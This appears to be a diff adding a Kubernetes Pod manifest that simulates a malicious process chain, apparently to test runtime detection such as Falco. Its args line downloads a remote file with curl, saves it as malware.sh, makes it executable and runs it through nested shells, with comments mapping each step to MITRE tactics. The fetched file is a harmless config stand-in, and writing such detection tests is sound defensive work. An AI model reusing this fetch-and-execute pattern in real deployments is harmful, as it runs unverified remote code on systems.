@@ -1,0 +1,17 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: deep-process-tree-pod
+  namespace: default
+  labels:
+    app: vulnerable
+spec:
+  containers:
+    - name: tree-test
+      image: ubuntu:22.04
+      command: ["/bin/bash", "-c"]
+      # 1. Lansează un shell. (MITRE Execution)
+      # 2. Descarcă un payload cu curl (MITRE Command and Control)
+      # 3. Îl bagă într-un alt bash
+      args:
+        - 'sleep 10; curl -s https://raw.githubusercontent.com/falcosecurity/falco/master/docker/falco/falco.yaml -o malware.sh; chmod +x malware.sh; bash -c ''sh -c "./malware.sh"''; sleep 3600'
